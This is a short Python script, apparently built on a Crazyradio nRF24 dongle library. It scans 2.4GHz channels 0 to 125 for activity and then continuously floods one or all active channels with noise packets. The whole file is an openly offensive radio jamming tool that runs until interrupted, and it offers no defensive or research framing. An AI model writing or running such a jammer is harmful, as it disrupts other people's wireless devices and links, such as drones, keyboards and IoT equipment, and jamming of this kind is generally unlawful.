import time
from crazyradio import Crazyradio

def scan_channels():
    """Scan for active nRF24 channels in the 2.4GHz range."""
    cr = Crazyradio()
    cr.set_data_rate(Crazyradio.DR_2MPS)  # Set 2Mbps data rate for scanning

    active_channels = []
    print("\nScanning channels 0-125 for activity...")
    
    for ch in range(126):  # nRF24 supports channels 0-125
        cr.set_channel(ch)
        response = cr.receive()
        
        if response and response.data:
            print(f"[+] Activity detected on channel {ch}")
            active_channels.append(ch)
    
    if not active_channels:
        print("[-] No active channels found.")
    else:
        print(f"\nActive channels: {active_channels}")
    
    return active_channels

def jam_channels(channels):
    """Continuously flood specified channels with noise."""
    cr = Crazyradio()
    cr.set_data_rate(Crazyradio.DR_2MPS)

    print(f"\n[!] Jamming channels: {channels}")
    
    try:
        while True:
            for ch in channels:
                cr.set_channel(ch)
                cr.send(b'\xFF' * 32)  # Sending max payload of noise
                time.sleep(0.002)  # Small delay to maximize efficiency
    except KeyboardInterrupt:
        print("\n[!] Stopping jammer...")
        cr.close()

def main():
    active_channels = scan_channels()
    
    if not active_channels:
        return

    choice = input("\n[?] Jam (1) One channel or (2) All detected? (1/2): ").strip()

    if choice == "1":
        target_ch = int(input(f"Enter target channel from {active_channels}: ").strip())
        if target_ch in active_channels:
            jam_channels([target_ch])
        else:
            print("[-] Invalid channel selected.")
    elif choice == "2":
        jam_channels(active_channels)
    else:
        print("[-] Invalid option.")

if __name__ == "__main__":
    main()
